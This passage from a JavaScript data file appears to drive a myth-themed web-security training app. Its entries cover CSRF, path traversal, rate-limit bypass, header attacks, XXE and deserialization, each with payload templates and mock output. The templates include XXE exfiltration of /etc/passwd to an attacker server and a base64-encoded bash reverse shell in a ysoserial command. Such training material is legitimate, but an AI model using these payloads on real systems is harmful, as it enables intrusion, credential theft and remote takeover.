          { id: 'advcsrf-exploit-other-1', title: "CSRF via XSS", commandTemplate: "# If XSS found on vulnerable.site:\n# <script> fetch('{{targetActionUrl}}', {method:'POST', body: 'email=new@evil.com&{{csrfParamName}}=TOKEN_IF_NEEDED_VIA_DOM'}); </script>", explanation: "XSS can read tokens from DOM or make same-origin requests.", mockOutput: "Victim's email changed via XSS-triggered CSRF." }
        ]
      },
      {
        id: 'advcsrf-postexploit',
        title: 'Post-Exploitation',
        description: "Successfully forged requests can lead to account takeover, unauthorized data modification, or performing any action the victim user is permitted to do.",
        codeSteps: [
          { id: 'advcsrf-postexploit-1', title: "Verify Action", commandTemplate: "# Check if the intended action (e.g., email change on {{targetActionUrl}}) was successful on victim's account.", explanation: "Confirm impact of the CSRF attack.", mockOutput: "Victim's account settings updated." }
        ]
      }
    ],
    resources: [
      { name: 'OWASP: CSRF Prevention Cheat Sheet', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html', icon: "fas fa-scroll" },
      { name: 'PortSwigger: Advanced CSRF', url: 'https://portswigger.net/web-security/csrf/bypassing-token-validation', icon: "fas fa-flask" }
    ]
  },
  {
    id: 'advmyth-kraken-dirtrav',
    slug: 'adv-kraken-of-directory-traversal',
    title: 'The Kraken of Directory Traversal',
    iconClass: 'fas fa-folder-tree', // Changed to better represent file system structure
    legend: 'Wrangle the tentacles of path traversal to reveal hidden files, bypassing filters and escaping chroot jails.',
    narrativeIntro: "The Kraken, a beast of many tentacles, lurks in the file systems of web servers. Each tentacle (user-supplied filename or path) probes for weaknesses in how the server accesses files. If input validation is weak, a tentacle can reach outside the webroot, grasping sensitive configuration files, source code, or system files. The hero must master path normalization, encoding, and null byte tricks to outwit the Kraken and expose its hidden treasures.",
    vulnerabilityAnalogy: "Advanced Directory Traversal (Path Traversal) involves bypassing filters designed to prevent access to files outside the intended web document root. This includes using various encoding techniques, null bytes (if applicable), and understanding how different OS and web servers handle paths.",
    customParams: [
      { id: 'fileIncludeEndpoint', label: 'File Inclusion Endpoint (e.g., /view?file=):', defaultValue: 'https://vulnerable.site/app/load_resource?name=', placeholder: 'e.g., /download?path=' },
      { id: 'sensitiveFile', label: 'Target Sensitive File:', defaultValue: '../../../../../../../../../../etc/passwd', placeholder: 'e.g., ../../windows/win.ini' }
    ],
    phases: [
      {
        id: 'advdirtrav-recon',
        title: 'Reconnaissance',
        description: "Identify all parameters that accept filenames or paths ({{fileIncludeEndpoint}}). Understand the server OS (Windows/Linux) as traversal sequences differ. Check for obvious filters.",
        codeSteps: [
          { id: 'advdirtrav-recon-1', title: "Basic Traversal Test", commandTemplate: "{{fileIncludeEndpoint}}../../index.html", explanation: "Test basic .. sequences.", mockOutput: "Contents of a file from a parent directory displayed." },
          { id: 'advdirtrav-recon-2', title: "OS Fingerprinting (if possible)", commandTemplate: "# Observe error messages or default file locations if traversal is partially successful.", explanation: "Clues about OS help craft specific payloads.", mockOutput: "Error: File C:\\inetpub\\wwwroot\\..\\file not found (indicates Windows)" }
        ]
      },
      {
        id: 'advdirtrav-exploit-filterbypass',
        title: 'Exploitation',
        description: "Bypass filters that strip or block `../`. Techniques include URL encoding (`%2e%2e%2f`), double URL encoding (`%252e%252e%252f`), non-standard encodings, using absolute paths (if webroot is known), or null byte injection (`%00`) if the backend language is vulnerable (e.g., older PHP/C).",
        codeSteps: [
          { id: 'advdirtrav-exploit-bypass-1', title: "URL Encoded Traversal", commandTemplate: "{{fileIncludeEndpoint}}%2e%2e%2f%2e%2e%2fetc%2fpasswd", explanation: "Bypass simple string matching filters.", mockOutput: "root:x:0:0..." },
          { id: 'advdirtrav-exploit-bypass-2', title: "Null Byte (Older Systems)", commandTemplate: "{{fileIncludeEndpoint}}../../etc/passwd%00.jpg", explanation: "Null byte truncates string, potentially bypassing extension checks.", mockOutput: "root:x:0:0... (if vulnerable)"}
        ]
      },
      {
        id: 'advdirtrav-exploit-context',
        title: 'Exploitation',
        description: "Target specific sensitive files based on OS ({{sensitiveFile}}): `/etc/passwd`, `/etc/shadow` (Linux); `C:\\Windows\\win.ini`, web server config files (`httpd.conf`, `.htaccess`), application source code, or log files.",
        codeSteps: [
          { id: 'advdirtrav-exploit-context-1', title: "Accessing Target File", commandTemplate: "{{fileIncludeEndpoint}}{{sensitiveFile}}", explanation: "Attempt to read the specified sensitive file.", mockOutput: "Contents of {{sensitiveFile}} displayed." }
        ]
      },
      {
        id: 'advdirtrav-postexploit',
        title: 'Post-Exploitation',
        description: "Leaked information (credentials from config files, source code) can lead to further compromise, such as direct server access or exploiting other vulnerabilities revealed in the code.",
        codeSteps: [
          { id: 'advdirtrav-postexploit-1', title: "Extract Credentials from Config", commandTemplate: "# If {{sensitiveFile}} was a config file with DB_PASSWORD='secret'", explanation: "Use leaked credentials to access other services.", mockOutput: "Successfully connected to database using leaked credentials." }
        ]
      }
    ],
    resources: [
      { name: 'OWASP: Path Traversal', url: 'https://owasp.org/www-community/attacks/Path_Traversal', icon: "fas fa-folder-open" },
      { name: 'PortSwigger: Directory Traversal', url: 'https://portswigger.net/web-security/file-path-traversal', icon: "fas fa-flask" }
    ]
  },
  {
    id: 'advmyth-leviathan-ratelimit',
    slug: 'adv-leviathan-of-rate-limiting',
    title: 'The Leviathan of Rate Limiting',
    iconClass: 'fas fa-stopwatch-20', // Changed to reflect timing/speed
    legend: 'Battle massive request waves by identifying and bypassing rate limiting defenses on critical endpoints.',
    narrativeIntro: "The Leviathan, a colossal guardian of server resources, thrashes its tail (rate limits) at any who dare make too many requests. Its defenses are designed to repel brute-force storms and denial-of-service tsunamis. To overcome it, the hero must find cracks in its armor: unrated headers, IP rotation via proxies, different user agents, or flaws in how distributed rate limiting is implemented. Success means unleashing a targeted flood where others are merely trickles.",
    vulnerabilityAnalogy: "Bypassing rate limiting mechanisms can enable various attacks like brute-forcing credentials, OTPs, or promo codes; enumerating resources; or causing denial of service. Advanced techniques involve manipulating request headers, distributing attacks across multiple IPs/sessions, or finding untested API versions.",
    customParams: [
      { id: 'loginEndpoint', label: 'Endpoint to Test (e.g., /login):', defaultValue: 'https://vulnerable.site/api/login', placeholder: '/api/v1/resource' },
      { id: 'rateLimitHeader', label: 'Observed Rate Limit Header (e.g., X-RateLimit-Remaining):', defaultValue: 'X-RateLimit-Remaining', placeholder: 'e.g., Retry-After' }
    ],
    phases: [
      {
        id: 'advratelimit-recon',
        title: 'Reconnaissance',
        description: "Identify which endpoints ({{loginEndpoint}}) are rate-limited. Observe rate limiting headers (e.g., {{rateLimitHeader}}, Retry-After). Determine if limiting is based on IP, API key, user session, or other factors. Check if different HTTP methods on the same endpoint have different limits.",
        codeSteps: [
          { id: 'advratelimit-recon-1', title: "Basic Rate Limit Test", commandTemplate: "# Send rapid requests to {{loginEndpoint}} using Burp Intruder or a script.", explanation: "Observe when 429 Too Many Requests or similar errors occur.", mockOutput: "After 10 requests: HTTP/1.1 429 Too Many Requests\n{{rateLimitHeader}}: 0" },
          { id: 'advratelimit-recon-2', title: "Header Analysis", commandTemplate: "# Check responses for headers like X-RateLimit-Limit, X-RateLimit-Remaining, Retry-After.", explanation: "Understand the rate limiting policy.", mockOutput: "X-RateLimit-Limit: 100\nX-RateLimit-Remaining: 85\nRetry-After: 60" }
        ]
      },
      {
        id: 'advratelimit-exploit-bypass',
        title: 'Exploitation',
        description: "Attempt to bypass rate limits: Use different IP addresses (proxies, VPNs, Tor). Modify HTTP headers that might influence the keying (X-Forwarded-For, User-Agent, custom headers). Try different API versions or subdomains that might have separate limits. Test for race conditions in counter updates.",
        codeSteps: [
          { id: 'advratelimit-exploit-bypass-1', title: "IP Rotation (Conceptual)", commandTemplate: "# Configure Burp Intruder with a list of proxy IPs.", explanation: "Distribute requests across multiple source IPs.", mockOutput: "Requests from different IPs bypass individual IP-based limits." },
          { id: 'advratelimit-exploit-bypass-2', title: "Header Spoofing (X-Forwarded-For)", commandTemplate: "# Add header to requests: X-Forwarded-For: 1.2.3.4 (random IP)", explanation: "If server trusts this header for client IP identification.", mockOutput: "Rate limit bypassed or keyed to spoofed IP."}
        ]
      },
      {
        id: 'advratelimit-exploit-logic',
        title: 'Exploitation',
        description: "Look for logical flaws. Is rate limiting applied per user *after* authentication, allowing unlimited pre-auth attempts? Are password reset or account recovery functions less strictly limited? Can you use null/empty values for identifying parameters to confuse the limiter?",
        codeSteps: [
          { id: 'advratelimit-exploit-logic-1', title: "Test Unauthenticated Endpoints", commandTemplate: "# Brute-force username enumeration on {{loginEndpoint}} before IP gets blocked.", explanation: "Pre-auth endpoints might have weaker limits.", mockOutput: "Successfully enumerated 100 usernames before block." }
        ]
      },
      {
        id: 'advratelimit-postexploit',
        title: 'Post-Exploitation',
        description: "Successful bypass allows for effective brute-forcing of credentials, OTPs, gift card codes, or resource enumeration. Can also contribute to DoS if limits are completely removed.",
        codeSteps: [
          { id: 'advratelimit-postexploit-1', title: "Successful Brute-Force", commandTemplate: "# With rate limit bypassed, run full password brute-force on {{loginEndpoint}}.", explanation: "Gain unauthorized access.", mockOutput: "Password 'password123' found for user 'admin'." }
        ]
      }
    ],
    resources: [
      { name: 'OWASP: Blocking Brute Force Attacks', url: 'https://owasp.org/www-community/attacks/Brute_force_attack#Blocking_Brute_Force_Attacks', icon: "fas fa-ban" },
      { name: 'PortSwigger: Rate Limiting', url: 'https://portswigger.net/web-security/rate-limiting', icon: "fas fa-tachometer-alt" }
    ]
  },
  {
    id: 'advmyth-cyclops-header',
    slug: 'adv-cyclops-of-header-manipulation',
    title: 'The Cyclops of Header Manipulation',
    iconClass: 'fas fa-heading',
    legend: 'One-eyed focus on forging and bypassing HTTP headers for exploits like Host Header Injection, Cache Poisoning, and Smuggling.',
    narrativeIntro: "The Cyclops, with its single, unwavering gaze, scrutinizes the HTTP headers of every request. It trusts these headers to guide its actions – routing, caching, authentication. But a cunning hero can forge or manipulate these headers (Host, X-Forwarded-For, Cache-Control, Transfer-Encoding) to trick the Cyclops. This can lead to misrouted requests, poisoned caches serving malicious content, or even request smuggling that bypasses its defenses entirely. Its singular focus on headers is its strength and its exploitable weakness.",
    vulnerabilityAnalogy: "Advanced HTTP Header Manipulation involves exploiting how servers and proxies parse and trust various HTTP headers. This can lead to Host Header Injection, Web Cache Poisoning, HTTP Request Smuggling (revisited with focus on header interaction), and bypassing security controls reliant on headers.",
    customParams: [
      { id: 'targetHostHeader', label: 'Target Host (for Host header tests):', defaultValue: 'vulnerable.site', placeholder: 'The application hostname' },
      { id: 'cacheableResource', label: 'Cacheable Resource Path:', defaultValue: '/static/main.js', placeholder: '/assets/style.css' }
    ],
    phases: [
      {
        id: 'advheader-recon',
        title: 'Reconnaissance',
        description: "Identify all relevant HTTP headers used by the application and any upstream proxies (e.g., Host, X-Forwarded-Host, X-Forwarded-For, User-Agent, Referer, Cache-Control, custom headers like X-API-Version). Understand how they influence application behavior.",
        codeSteps: [
          { id: 'advheader-recon-1', title: "Basic Header Probing", commandTemplate: "# Send requests to {{targetHostHeader}} with various X-Forwarded-Host values using Burp Repeater.", explanation: "Observe if X-Forwarded-Host overrides Host header for URL generation.", mockOutput: "Links in response now point to X-Forwarded-Host value." },
          { id: 'advheader-recon-2', title: "Cache Header Analysis", commandTemplate: "# Check Cache-Control, Pragma, Expires, Vary headers on {{cacheableResource}}.", explanation: "Understand caching behavior.", mockOutput: "Vary: User-Agent\nCache-Control: public, max-age=3600" }
        ]
      },
      {
        id: 'advheader-exploit-host',
        title: 'Exploitation',
        description: "Exploit Host Header Injection: Send ambiguous Host headers (e.g., multiple Host headers, absolute URI in request line). Target password reset poisoning, internal SSRF via manipulated Host, or cache poisoning.",
        codeSteps: [
          { id: 'advheader-exploit-host-1', title: "Password Reset Poisoning", commandTemplate: "# Initiate password reset for victim, intercept request. Change Host header to attacker.com.\n# Victim receives email with reset link pointing to attacker.com.", explanation: "If server uses Host header to generate reset links.", mockOutput: "Password reset token for victim sent to attacker.com." },
          { id: 'advheader-exploit-host-2', title: "Host Header for Internal SSRF", commandTemplate: "# Send request with Host: internal-service.local, but to public IP of {{targetHostHeader}}.", explanation: "If app uses Host header to route internal requests.", mockOutput: "Response from internal-service.local." }
        ]
      },
      {
        id: 'advheader-exploit-cache',
        title: 'Exploitation',
        description: "Exploit Web Cache Poisoning: Manipulate headers (e.g., X-Forwarded-Host, unkeyed custom headers) to cause the cache to store a malicious response for a legitimate URL ({{cacheableResource}}). This response is then served to other users.",
        codeSteps: [
          { id: 'advheader-exploit-cache-1', title: "Cache Poisoning via X-Forwarded-Host", commandTemplate: "# Request {{targetHostHeader}}{{cacheableResource}} with X-Forwarded-Host: attacker.com\n# If response reflects attacker.com and is cached, other users get it.", explanation: "Inject malicious content into cache.", mockOutput: "Cache for {{cacheableResource}} now serves content from attacker.com." }
        ]
      },
      {
        id: 'advheader-exploit-smuggling',
        title: 'Exploitation',
        description: "HTTP Request Smuggling (revisited): Focus on how ambiguous Transfer-Encoding or Content-Length headers, especially in conjunction with proxy behavior, can lead to desynchronization and request tunnelling.",
        codeSteps: [
          { id: 'advheader-exploit-smuggling-1', title: "CL.TE Smuggling", commandTemplate: "POST / HTTP/1.1\nHost: {{targetHostHeader}}\nContent-Length: 11\nTransfer-Encoding: chunked\n\n0\n\nSMUGGLED", explanation: "Frontend uses Content-Length, backend uses Transfer-Encoding.", mockOutput: "SMUGGLED request processed by backend for next user." }
        ]
      },
      {
        id: 'advheader-postexploit',
        title: 'Post-Exploitation',
        description: "Successful header manipulation can lead to widespread XSS (via cache poisoning), account takeovers (password reset poisoning), or full server compromise (via request smuggling leading to admin panel access).",
        codeSteps: [
          { id: 'advheader-postexploit-1', title: "Verify Cache Poisoning Impact", commandTemplate: "# Request {{targetHostHeader}}{{cacheableResource}} from a different browser/IP.", explanation: "Confirm poisoned cache is served to others.", mockOutput: "Malicious content from attacker.com served." }
        ]
      }
    ],
    resources: [
      { name: 'PortSwigger: Host Header Attacks', url: 'https://portswigger.net/web-security/host-header', icon: "fas fa-server" },
      { name: 'PortSwigger: Web Cache Poisoning', url: 'https://portswigger.net/web-security/web-cache-poisoning', icon: "fas fa-archive" },
      { name: 'PortSwigger: HTTP Request Smuggling', url: 'https://portswigger.net/web-security/request-smuggling', icon: "fas fa-truck-monster" }
    ]
  },
  {
    id: 'advmyth-labyrinth-xxe',
    slug: 'adv-labyrinth-of-xxe',
    title: 'The Labyrinth of XXE',
    iconClass: 'fas fa-code-branch', // Represents branching logic of XML
    legend: 'Navigate the maze of XML parsers, exploiting XXE for file disclosure, SSRF, and out-of-band data exfiltration.',
    narrativeIntro: "The Labyrinth of XXE is a twisting maze of XML parsers and Document Type Definitions (DTDs). Within its walls, external entities can become treacherous paths, leading the parser astray. The hero must craft malicious DTDs to make the parser reveal secret scrolls (local files), query hidden oracles (internal network services via SSRF), or even send signals out of the labyrinth through out-of-band channels when direct escape is blocked. Each turn (parser feature) can be a trap or an opportunity.",
    vulnerabilityAnalogy: "Advanced XML External Entity (XXE) injection involves exploiting XXE vulnerabilities not just for basic file disclosure, but also for SSRF, parameter entity attacks for out-of-band (OOB) data exfiltration (blind XXE), and bypassing filters on entity declarations.",
    customParams: [
      { id: 'xmlEndpoint', label: 'XML Processing Endpoint:', defaultValue: 'https://vulnerable.site/api/processXML', placeholder: 'e.g., /api/import' },
      { id: 'attackerServer', label: 'Attacker Server (for OOB):', defaultValue: 'attacker.com', placeholder: 'Your server for OOB data' }
    ],
    phases: [
      {
        id: 'advxxe-recon',
        title: 'Reconnaissance',
        description: "Identify all endpoints ({{xmlEndpoint}}) that accept XML data. Test if the XML parser resolves external entities. Determine the type of XML parser if possible (can influence payload).",
        codeSteps: [
          { id: 'advxxe-recon-1', title: "Basic XXE Pingback", commandTemplate: "<!-- Payload for {{xmlEndpoint}} -->\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"http://{{attackerServer}}/ping\"> ]>\n<data>&xxe;</data>", explanation: "Check if parser makes external HTTP requests.", mockOutput: "HTTP request received on {{attackerServer}}/ping" }
        ]
      },
      {
        id: 'advxxe-exploit-file',
        title: 'File Disclosure via XXE',
        description: "Exploit XXE to read arbitrary files from the server's filesystem. This includes sensitive configuration files, source code, or system files like /etc/passwd or C:\\Windows\\win.ini.",
        codeSteps: [
          { id: 'advxxe-exploit-file-1', title: "Read /etc/passwd", commandTemplate: "<!-- Payload for {{xmlEndpoint}} -->\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>\n<data>&xxe;</data>", explanation: "Attempt to exfiltrate /etc/passwd.", mockOutput: "Response contains: root:x:0:0..." }
        ]
      },
      {
        id: 'advxxe-exploit-ssrf',
        title: 'SSRF via XXE',
        description: "Leverage XXE to perform Server-Side Request Forgery attacks. Make the server send requests to internal network resources or cloud metadata services.",
        codeSteps: [
          { id: 'advxxe-exploit-ssrf-1', title: "SSRF to Internal Host", commandTemplate: "<!-- Payload for {{xmlEndpoint}} -->\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"http://127.0.0.1:8080/admin\"> ]>\n<data>&xxe;</data>", explanation: "Attempt to access an internal admin panel.", mockOutput: "Response contains content from internal service or an error indicating connection attempt." }
        ]
      },
      {
        id: 'advxxe-exploit-oob',
        title: 'Blind XXE (Out-of-Band Exfiltration)',
        description: "When direct file disclosure or SSRF responses are not visible, use parameter entities and an external DTD to exfiltrate data out-of-band (e.g., via DNS lookups or HTTP requests to an attacker-controlled server {{attackerServer}}).",
        codeSteps: [
          { id: 'advxxe-exploit-oob-1', title: "External DTD for OOB (Conceptual)", commandTemplate: "<!-- Attacker's DTD (e.g., evil.dtd on {{attackerServer}}) -->\n<!ENTITY % file SYSTEM \"file:///etc/passwd\">\n<!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://{{attackerServer}}/?content=%file;'>\">\n%eval;\n%exfil;", explanation: "External DTD forces server to fetch file and send its content to attacker.", mockOutput: "HTTP request to {{attackerServer}} with /etc/passwd content in query parameter." },
          { id: 'advxxe-exploit-oob-2', title: "Trigger External DTD", commandTemplate: "<!-- Payload for {{xmlEndpoint}} -->\n<!DOCTYPE foo [<!ENTITY % xxeDTD SYSTEM \"http://{{attackerServer}}/evil.dtd\"> %xxeDTD;]>", explanation: "Make the vulnerable server load the attacker's DTD.", mockOutput: "(No direct response, check attacker server logs)" }
        ]
      },
      {
        id: 'advxxe-postexploit',
        title: 'Post-Exploitation',
        description: "Information gathered (credentials, internal network structure, source code) can be used for further attacks, privilege escalation, or deeper network penetration.",
        codeSteps: [
          { id: 'advxxe-postexploit-1', title: "Analyze Leaked Source Code", commandTemplate: "# If source code (e.g., config.php) was exfiltrated, look for hardcoded credentials.", explanation: "Use disclosed information.", mockOutput: "Found DB_USER='admin', DB_PASS='hardcoded_secret' in leaked file." }
        ]
      }
    ],
    resources: [
      { name: 'OWASP: XXE Prevention Cheat Sheet', url: 'https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html', icon: "fas fa-scroll" },
      { name: 'PortSwigger: XXE Injection', url: 'https://portswigger.net/web-security/xxe', icon: "fas fa-flask" },
      { name: 'PayloadsAllTheThings: XXE Injection', url: 'https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection', icon: "fab fa-github" }
    ]
  },
  {
    id: 'advmyth-shadows-deserialization',
    slug: 'adv-shadows-of-insecure-deserialization',
    title: 'The Shadows of Insecure Deserialization',
    iconClass: 'fas fa-ghost', // Represents hidden execution flow
    legend: 'Explore the dangers of deserializing untrusted data, leading to Remote Code Execution with crafted object gadgets.',
    narrativeIntro: "In the shadowy corners of object-oriented systems, data is serialized into seemingly harmless streams, only to be resurrected (deserialized) later. If an attacker can control this data stream, they can craft malevolent 'object gadgets' – sequences of code within existing application classes that, when deserialized, execute unintended operations. This dark magic can grant the attacker control over the server, a ghost in the machine. The hero must understand the language's dark arts (Java's RMI, Python's Pickle, PHP's unserialize) to chain these gadgets and achieve RCE.",
    vulnerabilityAnalogy: "Insecure Deserialization vulnerabilities occur when an application deserializes untrusted or tampered data without sufficient validation, leading to potential Remote Code Execution (RCE), denial of service, or access control bypasses. This myth focuses on understanding gadget chains and using tools like ysoserial.",
    customParams: [
      { id: 'deserialEndpoint', label: 'Endpoint processing serialized data:', defaultValue: 'https://vulnerable.site/api/loadSession', placeholder: 'e.g., /app/preferences' },
      { id: 'language', label: 'Target Language/Framework:', defaultValue: 'Java', type: 'select', options: ['Java', 'Python (Pickle)', 'PHP', '.NET'] },
      { id: 'ysoserialCmd', label: 'ysoserial Command (for Java):', defaultValue: "CommonsCollections5 'bash -c {echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjEwLjUvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}'", placeholder: "Gadget 'Command'" }
    ],
    phases: [
      {
        id: 'advdeserial-recon',
        title: 'Identifying Deserialization',
        description: "Identify where the application ({{deserialEndpoint}}) deserializes data. Look for base64 encoded strings in parameters, cookies (e.g., session cookies), or request bodies. Check for specific content types or magic bytes indicative of serialized objects for {{language}}.",
        codeSteps: [
          { id: 'advdeserial-recon-1', title: "Identify Serialized Data", commandTemplate: "# Intercept requests to {{deserialEndpoint}}. Look for patterns like 'rO0...' (Java), ' K...' (Python Pickle), 'O:8:\"UserClass\"...' (PHP).", explanation: "Recognize signatures of serialized data.", mockOutput: "Cookie 'USER_PREFS' contains base64 encoded string: rO0ABXNy... (Java)" }
        ]
      },
      {
        id: 'advdeserial-gadgets',
        title: 'Object Gadgets',
        description: "Understand 'gadget chains'. These are sequences of method calls on existing, serializable classes within the application's classpath that, when triggered during deserialization, lead to a desired effect (like command execution). Gadgets depend on the {{language}} and available libraries.",
        codeSteps: [
          { id: 'advdeserial-gadgets-1', title: "Research Gadgets for {{language}}", commandTemplate: "# Search for known gadget chains for {{language}} libraries (e.g., Apache Commons Collections for Java).", explanation: "Identify exploitable classes/methods.", mockOutput: "Apache Commons Collections has known RCE gadgets if specific classes are used." }
        ]
      },
      {
        id: 'advdeserial-payloadgen',
        title: 'Payload Generation',
        description: "Use tools like ysoserial (for Java) or phpgc (for PHP) to generate malicious serialized objects (payloads) that trigger identified gadget chains. The payload typically aims to execute a command on the server.",
        codeSteps: [
          { id: 'advdeserial-payloadgen-1', title: "Generate ysoserial Payload (Java)", commandTemplate: "java -jar ysoserial.jar {{ysoserialCmd}} > payload.ser", explanation: "Create a serialized Java object that executes the specified command.", mockOutput: "payload.ser created successfully." }
        ]
      },
      {
        id: 'advdeserial-exploit-rce',
        title: 'Achieving RCE via Deserialization',
        description: "Send the crafted serialized payload to the vulnerable endpoint ({{deserialEndpoint}}). If successful, the server will deserialize the object and execute the embedded command, potentially leading to a reverse shell or other forms of RCE.",
        codeSteps: [
          { id: 'advdeserial-exploit-rce-1', title: "Send Malicious Payload", commandTemplate: "# Send contents of payload.ser (e.g., base64 encoded) to {{deserialEndpoint}} in the vulnerable parameter/cookie.", explanation: "Trigger the deserialization vulnerability.", mockOutput: "(Reverse shell connects back to attacker if command was for a shell)" }
        ]
      },
      {
        id: 'advdeserial-postexploit',
        title: 'Post-Exploitation',
        description: "With RCE achieved, establish persistence, escalate privileges, exfiltrate data, and pivot within the network, similar to other RCE scenarios.",
        codeSteps: [
          { id: 'advdeserial-postexploit-1', title: "Stabilize Shell & Escalate", commandTemplate: "# (From reverse shell) python -c 'import pty; pty.spawn(\"/bin/bash\")'", explanation: "Upgrade shell and begin local privilege escalation.", mockOutput: "Interactive bash shell obtained." }
        ]
      }
    ],
    resources: [
      { name: 'OWASP: Deserialization Cheat Sheet', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html', icon: "fas fa-scroll" },
      { name: 'PortSwigger: Insecure Deserialization', url: 'https://portswigger.net/web-security/deserialization', icon: "fas fa-flask" },
      { name: 'ysoserial GitHub', url: 'https://github.com/frohoff/ysoserial', icon: "fab fa-java" }
    ]
  },
  // New Advanced Mythology Items
  {
    id: 'advmyth-racecon-chronos-gambit',
    slug: 'adv-racecon-chronos-gambit',
    title: "Chronos's Gambit (Race Conditions)",
    iconClass: 'fas fa-hourglass-half',
    legend: 'Exploit timing discrepancies in multi-step operations to achieve unintended outcomes like bypassing limits or duplicating actions.',
    narrativeIntro: "Chronos, the titan of time, watches as applications perform multi-step operations. A slight desynchronization, a momentary lapse in atomic execution, and the hero can slip through the cracks of time. By sending rapid, concurrent requests, the hero can make the system process an action twice before a limit is applied, or read a value before it's updated, turning the flow of time to their advantage.",
    vulnerabilityAnalogy: "Race conditions occur when the security or correctness of an operation depends on the sequence or timing of other uncontrollable events. Exploiting them often involves sending multiple requests simultaneously to take advantage of a small window where a check and a subsequent action are not atomic. This can lead to bypassing rate limits, duplicating transactions, or causing inconsistent states.",
    customParams: [
      { id: 'targetEndpoint', label: 'Target Endpoint for Race Condition:', defaultValue: 'https://api.example.com/redeem-coupon', placeholder: 'e.g., /api/apply_discount' },
      { id: 'requestData', label: 'Request Data (JSON, if POST):', defaultValue: '{"coupon_code":"RACEFREE100"}', placeholder: 'e.g., {"item_id": "123"}' },
      { id: 'numRequests', label: 'Number of Concurrent Requests:', defaultValue: '20', type: 'number' }
    ],
    phases: [
      {
        id: 'advrace-understanding',
        title: 'Understanding',
        description: "Identify operations that involve multiple steps or rely on shared resources (e.g., applying a discount, redeeming a voucher, voting, transferring funds). Look for checks (e.g., check balance, check limit) followed by actions (e.g., debit account, apply discount).",
        codeSteps: [
          { id: 'advrace-understanding-1', title: "Analyze Multi-Step Process", commandTemplate: "# Map out the sequence of operations for {{targetEndpoint}}.\n# Example: 1. Check if coupon is valid. 2. Apply coupon. 3. Mark coupon as used.", explanation: "Identify potential race windows between steps.", mockOutput: "Potential race between step 2 and 3 if not atomic." }
        ]
      },
      {
        id: 'advrace-exploitation',
        title: 'Exploitation',
        description: "Use tools like Burp Suite's Turbo Intruder, custom scripts (e.g., Python with `asyncio` or `threading`), or `ffuf -P` for concurrent requests. Send {{numRequests}} identical or slightly varied requests to {{targetEndpoint}} simultaneously.",
        codeSteps: [
          { id: 'advrace-exploitation-1', title: "Turbo Intruder Script (Conceptual)", commandTemplate: "# Python script for Turbo Intruder to send {{numRequests}} requests:\ndef queueRequests(target, wordlists):\n    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections={{numRequests}}, requestsPerConnection=1)\n    for i in range({{numRequests}}):\n        engine.queue(target.req, {{requestData}})", explanation: "Send a burst of concurrent requests.", mockOutput: "Multiple successful responses (e.g., coupon redeemed {{numRequests}} times instead of once)." },
          { id: 'advrace-exploitation-2', title: "Observing Results", commandTemplate: "# Monitor application state (e.g., balance, number of items, logs) after sending requests to {{targetEndpoint}}.", explanation: "Check if the action was performed more times than allowed.", mockOutput: "Account balance shows discount applied multiple times / Voucher used more than once."}
        ]
      },
      {
        id: 'advrace-defense',
        title: 'Defense',
        description: "Implement proper locking mechanisms (mutexes, semaphores) to ensure critical sections of code are executed atomically. Use database-level constraints or transactions. Design operations to be idempotent where possible.",
        codeSteps: [
          { id: 'advrace-defense-1', title: "Atomic Operations", commandTemplate: "# Conceptual: Use database transactions to ensure check-and-use operations are atomic.\n# BEGIN TRANSACTION; SELECT status FROM coupons WHERE code='...'; UPDATE coupons SET used=1; COMMIT;", explanation: "Ensure operations complete fully or not at all.", mockOutput: "Proper locking prevents multiple redemptions." }
        ]
      }
    ],
    resources: [
      { name: 'OWASP: Race Conditions', url: 'https://owasp.org/www-community/vulnerabilities/Race_Conditions', icon: "fas fa-stopwatch" },
      { name: 'PortSwigger: Race Conditions', url: 'https://portswigger.net/web-security/race-conditions', icon: "fas fa-flask" }
    ]
  },
  {
    id: 'advmyth-cachepoison-polluted-spring',
    slug: 'adv-cachepoison-polluted-spring',
    title: 'The Polluted Spring (Web Cache Poisoning)',
    iconClass: 'fas fa-tint-slash',
    legend: 'Corrupt the shared water source (web cache) to serve poisoned content to unsuspecting users by manipulating unkeyed inputs.',
    narrativeIntro: "The Spring of Ephyra provides life-giving water (web content) to all travelers, its flow quickened by magical caches. A cunning trickster discovers that the spring's purity depends not just on its source, but also on unseen essences (unkeyed HTTP headers) carried by the wind. By tainting these essences, the trickster can poison the cached water, so all who drink from it later receive the tainted draught, believing it pure.",
    vulnerabilityAnalogy: "Web Cache Poisoning occurs when an attacker can manipulate the web cache (e.g., CDN, reverse proxy cache, browser cache) to store a malicious HTTP response for a legitimate URL. This malicious response is then served to other users who request the same URL. The attack often involves exploiting unkeyed inputs (like certain HTTP headers or cookies) that affect the response but are not part of the cache key.",
    customParams: [
      { id: 'targetCacheUrl', label: 'Target Cacheable URL:', defaultValue: 'https://vulnerable.site/static/main.js', placeholder: 'e.g., /assets/app.js' },
      { id: 'headerToInject', label: 'Header to Test for Unkeyed Input:', defaultValue: 'X-Forwarded-Host', placeholder: 'e.g., X-Original-URL, User-Agent' },
      { id: 'injectedValue', label: 'Value to Inject in Header:', defaultValue: 'malicious-domain.com', placeholder: 'e.g., <script>alert(1)</script>.example.com'}
    ],
    phases: [
      {
        id: 'advcache-understanding',
        title: 'Understanding',
        description: "Identify cacheable resources ({{targetCacheUrl}}). Analyze caching behavior: Cache-Control, Pragma, Expires, Age headers. Identify the cache key: What parts of the request (URL, specific headers like Vary) are used to determine if a cached response can be served?",
        codeSteps: [
          { id: 'advcache-understanding-1', title: "Analyze Cache Headers", commandTemplate: "# Send GET request to {{targetCacheUrl}}.\n# Observe Cache-Control, Vary, Age, Pragma, Expires headers.", explanation: "Determine if and how the resource is cached.", mockOutput: "Cache-Control: public, max-age=3600\nVary: Accept-Encoding" },
